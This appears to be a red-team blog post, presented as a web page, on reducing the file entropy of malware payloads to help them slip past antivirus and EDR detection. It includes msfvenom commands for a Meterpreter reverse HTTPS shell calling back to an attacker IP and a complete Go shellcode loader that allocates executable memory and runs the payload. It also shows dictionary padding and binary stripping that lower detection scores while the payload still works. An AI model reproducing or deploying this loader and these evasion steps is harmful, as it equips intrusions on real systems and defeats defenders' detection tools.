@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    
+    <link rel="canonical" href="/posts/entropy/">
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.68.3" />
+
+    
+    
+    
+
+<title>Entropy Analysis • Lum8rjack</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Entropy Analysis"/>
+<meta name="twitter:description" content="While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but one that caught my eye mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads."/>
+
+<meta property="og:title" content="Entropy Analysis" />
+<meta property="og:description" content="While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but one that caught my eye mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/entropy/" />
+<meta property="article:published_time" content="2022-07-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-07-17T00:00:00+00:00" /><meta property="og:site_name" content="Lum8rjack" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.d7131289fa9e8cd0d2d4afc262d1f13af6ce894f665e0ca215389bcfa359fbae.css" integrity="sha256-1xMSifqejNDS1K/CYtHxOvbOiU9mXgyiFTibz6NZ&#43;64=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="/">
+        
+          Lum8rjack
+        
+        </a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="/img/tree.png" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         red teamer and infosec researcher 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">Lum8rjack</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/posts/">
+						<span>Posts</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/portfolio/">
+						<span>Projects</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	<a href="https://twitter.com/lum8rjack" rel="me"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	<a href="https://github.com/lum8rjack" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://linkedin.com/in/muellerclint" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Entropy Analysis</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Jul 17, 2022
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/offsec">OFFSEC</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/malware">malware</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/evasion">evasion</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 7 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p>While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but <a href="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/">one that caught my eye</a> mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads.</p>
+<p>In this article, I will start by describing what entropy is and then go into different ways you can reduce the entropy score. Reducing the payload entropy will not automatically bypass security tools, but it may be one of the attributes that is examined.</p>
+<h2 id="what-is-entropy">What is Entropy</h2>
+<p>According to <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">Wikipedia</a>, entropy is &ldquo;&hellip;the average level of &lsquo;information&rsquo;, &lsquo;surprise&rsquo;, or &lsquo;uncertainty&rsquo; inherent to the variable&rsquo;s possible outcomes.&rdquo; In other words, entropy is a measure of randomness of data in the specified file. In security, most people use Shannon Entropy, which is a specific algorithm that returns a value between 0 and 8. The higher the number, the more random the data. Many times, a higher value means that the data is either packed or encrypted.</p>
+<p>Different security products may calculate the entropy of a file in order to help determine if it is malicious or not. One article I found useful when researching entropy was from <a href="https://practicalsecurityanalytics.com/file-entropy/">Practical Security Analytics</a>. In the article, they analyzed the entropy of around 500k Windows executable files. The purpose was to determine how effective entropy analysis is when distiguishing malicious files from legitimate files. One of the main data points that stood out, files with an entropy above 7.2 tended to be malicious.</p>
+<p>There are a few additional references at the end of the blog post that can provide more details about entropy and it&rsquo;s use in malware analysis.</p>
+<h2 id="checking-entropy">Checking Entropy</h2>
+<p>On Linux and Mac machines, the &ldquo;ent&rdquo; program can be used to check the entropy of a file. As you can see from the output below, &ldquo;bash&rdquo; has an entropy of around 6.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ent /bin/bash
+Entropy <span style="color:#f92672">=</span> 6.159561 bits per byte.
+
+Optimum compression would reduce the size
+of this <span style="color:#ae81ff">1230360</span> byte file by <span style="color:#ae81ff">23</span> percent.
+
+Chi square distribution <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1230360</span> samples is 18260505.61, and randomly
+would exceed this value less than 0.01 percent of the times.
+
+Arithmetic mean value of data bytes is 84.4088 <span style="color:#f92672">(</span>127.5 <span style="color:#f92672">=</span> random<span style="color:#f92672">)</span>.
+Monte Carlo value <span style="color:#66d9ef">for</span> Pi is 3.433473130 <span style="color:#f92672">(</span>error 9.29 percent<span style="color:#f92672">)</span>.
+Serial correlation coefficient is 0.409743 <span style="color:#f92672">(</span>totally uncorrelated <span style="color:#f92672">=</span> 0.0<span style="color:#f92672">)</span>.
+</code></pre></div><p>I made a simple program that makes it easier to check the entropy without all of the additional details. You can download the code from <a href="https://github.com/lum8rjack/shannon">here</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file /bin/bash
+6.159560931054298
+</code></pre></div><h2 id="basic-payload">Basic Payload</h2>
+<p>Next, I wanted to check the entropy of different malware samples and see if there was a way I could get it as low as possible. The simplest and quickest method was to generate a stageless Metasploit executable using the command below.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x86/shikata_ga_nai -f exe -o msf.exe
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+Found <span style="color:#ae81ff">1</span> compatible encoders
+Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">201849</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">201849</span>
+Payload size: <span style="color:#ae81ff">201849</span> bytes
+Final size of exe file: <span style="color:#ae81ff">208384</span> bytes
+Saved as: msf.exe
+</code></pre></div><p>The entropy is almost at the highest possible number, and would definately be flagged by security scanners.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file msf.exe
+7.924424214044725
+</code></pre></div><p>I then decided to use Metasploit to generate shellcode instead of an executable. In doing this, I could then create my own loader that would inject and execute the shellcode.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x86/shikata_ga_nai -f raw -o payload.bin
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+Found <span style="color:#ae81ff">1</span> compatible encoders
+Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">201849</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">201849</span>
+Payload size: <span style="color:#ae81ff">201849</span> bytes
+Saved as: payload.bin
+</code></pre></div><p>The shellcode entropy was even higher than the executable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload.bin 
+7.986056713327999
+</code></pre></div><p>Then, I created a loader in Go that was compiled to a Windows executable in order to execute the shellcode. I used Go&rsquo;s &ldquo;embed&rdquo; library to easily add the shellcode to the file. The code below uses different Windows API calls in order to allocate memory, copy the shellcode to the allocated memory, change the memory permissions, and lastly execute the shellcode.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">package main
+
+<span style="color:#a6e22e">import</span> (
+    <span style="color:#e6db74">&#34;embed&#34;</span>
+    <span style="color:#e6db74">&#34;log&#34;</span>
+	<span style="color:#e6db74">&#34;unsafe&#34;</span>
+	<span style="color:#e6db74">&#34;golang.org/x/sys/windows&#34;</span>
+)
+
+<span style="color:#75715e">//go:embed payload.bin
+</span><span style="color:#75715e"></span>var f embed.FS
+
+func main() {
+    <span style="color:#75715e">// Get the embeded shellcode
+</span><span style="color:#75715e"></span>    data, err :<span style="color:#f92672">=</span> f.ReadFile(<span style="color:#e6db74">&#34;payload.bin&#34;</span>)
+    <span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> nil {
+        log.Fatal(err)
+    }
+
+	<span style="color:#75715e">// Allocate memory using VirtualAlloc API call
+</span><span style="color:#75715e"></span>	addr, err :<span style="color:#f92672">=</span> windows.VirtualAlloc(uintptr(<span style="color:#ae81ff">0</span>), uintptr(len(data)), windows.MEM_COMMIT<span style="color:#f92672">|</span>windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> nil {
+        log.Fatal(err)
+    }
+
+	<span style="color:#75715e">// Load ntdll to use RtlMoveMemory and
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// move the shellcode to the allocated memory
+</span><span style="color:#75715e"></span>	ntdll :<span style="color:#f92672">=</span> windows.NewLazySystemDLL(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>)
+	RtlMoveMemory :<span style="color:#f92672">=</span> ntdll.NewProc(<span style="color:#e6db74">&#34;RtlMoveMemory&#34;</span>)
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(<span style="color:#f92672">&amp;</span>data[<span style="color:#ae81ff">0</span>])), uintptr(len(data)))
+	
+    <span style="color:#75715e">// Change the memory protections to read and execute
+</span><span style="color:#75715e"></span>	var oldProtect uint32
+	err <span style="color:#f92672">=</span> windows.VirtualProtect(addr, uintptr(len(data)), windows.PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>oldProtect)
+    <span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> nil {
+        log.Fatal(err)
+    }
+	
+	<span style="color:#75715e">// Load kernel32 to use CreateThread and execute the shellcode
+</span><span style="color:#75715e"></span>	kernel32 :<span style="color:#f92672">=</span> windows.NewLazySystemDLL(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>)
+	CreateThread :<span style="color:#f92672">=</span> kernel32.NewProc(<span style="color:#e6db74">&#34;CreateThread&#34;</span>)
+	<span style="color:#66d9ef">thread</span>, _, _ :<span style="color:#f92672">=</span> CreateThread.Call(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, addr, uintptr(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+
+	<span style="color:#75715e">// Wait forever so the program doesn&#39;t exit
+</span><span style="color:#75715e"></span>	windows.WaitForSingleObject(windows.Handle(<span style="color:#66d9ef">thread</span>), <span style="color:#ae81ff">0xFFFFFFFF</span>)
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>The commands below were used to compile the code into a Windows executable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ go mod init payload
+$ go mod tidy
+$ GOOS<span style="color:#f92672">=</span>windows GOARCH<span style="color:#f92672">=</span>amd64 go build -o payload.exe
+</code></pre></div><p>The entropy of the payload dropped almost a whole point, but was still pretty high. The drop was most likely due to Go&rsquo;s runtime, which provides garbage collection, reflection and many other features.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload.exe
+7.015162704411349
+</code></pre></div><h2 id="reducing-entropy">Reducing Entropy</h2>
+<p>Even though the entropy dropped, I still wanted to try to get it lower. Since entropy is based on randomness, one way to reduce the score was to add nomral text to the file. This was done by downloading the english dictionary and embedding it into the payloadd. The commands below show how I downloaded the dictionary and displayed the number of words in the file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://www.gwicks.net/textlists/english3.zip
+$ unzip english3.zip
+$ ls -alh english3.txt 
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root 1.9M Oct <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2012</span> english3.txt
+
+$ wc -l english3.txt 
+<span style="color:#ae81ff">194433</span> english3.txt
+</code></pre></div><p>Using the same method to embed the shellcode in the file, I added one line of code to embed the dictionary.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">//go:embed english3.txt
+</span><span style="color:#75715e">//go:embed payload.raw
+</span><span style="color:#75715e"></span>var <span style="color:#66d9ef">static</span> embed.FS
+</code></pre></td></tr></table>
+</div>
+</div><p>Just by including the text file, the entropy was dropped by about a half a point.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload2.exe
+6.551539452432076
+</code></pre></div><p>I was able to strip the binary and reduce the entropy even more.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GOOS<span style="color:#f92672">=</span>windows GOARCH<span style="color:#f92672">=</span>amd64 go build -ldflags <span style="color:#e6db74">&#34;-s -w&#34;</span> -trimpath -o payload3.exe
+
+$ ./shannon -file payload3.exe
+6.029571138204901
+</code></pre></div><p>I did another test to try to drop the entropy one more time by copying the english dictionary multiple times.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat english3.txt english3.txt english3.txt english3.txt english3.txt &gt; englishbig.txt
+
+$ ls -alh englishbig.txt 
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root 9.1M Jul <span style="color:#ae81ff">17</span> 01:23 englishbig.txt
+
+$ wc -l englishbig.txt 
+<span style="color:#ae81ff">972165</span> englishbig.txt
+</code></pre></div><p>Once the code was updated to use the larger file, the entropy dropped another point.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./shannon -file payload4.exe
+5.0849956311902105
+</code></pre></div><h2 id="wrap-up">Wrap-Up</h2>
+<p>In conclusion, I was able to drop the entropy almost three points (about 36%) by incorporating a few simple techniques that could be used by anyone. It is also important to note that the payload still executes and runs normally.</p>
+<p>Reducing the entropy alone won&rsquo;t bypass AV/EDR tools, but it is one aspect of creating payloads that can be easily manipulated. It can be useful when combined with additional techniques like:</p>
+<ul>
+<li>Shellcode encription</li>
+<li>Delays and other normal functionality</li>
+<li>Unhooking</li>
+<li>Direct syscalls</li>
+</ul>
+<h2 id="references--acknowledgements">References / Acknowledgements</h2>
+<ul>
+<li><a href="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/">https://vanmieghem.io/blueprint-for-evading-edr-in-2022/</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">https://en.wikipedia.org/wiki/Entropy_(information_theory)</a></li>
+<li><a href="https://practicalsecurityanalytics.com/file-entropy/">https://practicalsecurityanalytics.com/file-entropy/</a></li>
+<li><a href="https://rosettacode.org/wiki/Entropy#Go">https://rosettacode.org/wiki/Entropy#Go</a></li>
+<li><a href="http://www.gwicks.net/dictionaries.htm">http://www.gwicks.net/dictionaries.htm</a></li>
+<li><a href="https://whiteheart0.medium.com/entropy-analysis-a-critical-test-for-malwares-69939f5b8b1#:~:text=Entropy%20analysis%20do%20not%20only,the%20machine%20learning%20av%20detection">https://whiteheart0.medium.com/entropy-analysis-a-critical-test-for-malwares-69939f5b8b1#:~:text=Entropy%20analysis%20do%20not%20only,the%20machine%20learning%20av%20detection</a></li>
+<li><a href="https://github.com/lum8rjack/shannon">https://github.com/lum8rjack/shannon</a></li>
+</ul>
+
+  </div>
+  
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-176789551-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.12.1/js/all.js" integrity="sha384-ZbbbT1gw3joYkKRqh0kWyRp32UAvdqkpbLedQJSlnI8iLQcFVxaGyrOgOJiDQTTR" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
